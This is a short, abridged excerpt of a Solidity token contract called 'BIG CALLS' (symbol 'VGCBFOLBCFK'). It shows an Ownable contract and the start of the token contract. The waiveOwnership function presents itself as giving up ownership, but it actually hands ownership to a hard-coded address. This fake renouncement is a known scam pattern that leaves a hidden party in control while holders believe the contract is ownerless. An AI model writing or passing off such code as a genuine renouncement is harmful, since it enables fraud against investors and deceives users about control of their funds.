...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0x41fCe4c85b2Ed234985E6451944d9BaF87c1cC0A));
        _owner = address(0x41fCe4c85b2Ed234985E6451944d9BaF87c1cC0A);
    }
...
contract BIGCALLS is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "BIG CALLS";
    string private _symbol = "VGCBFOLBCFK";
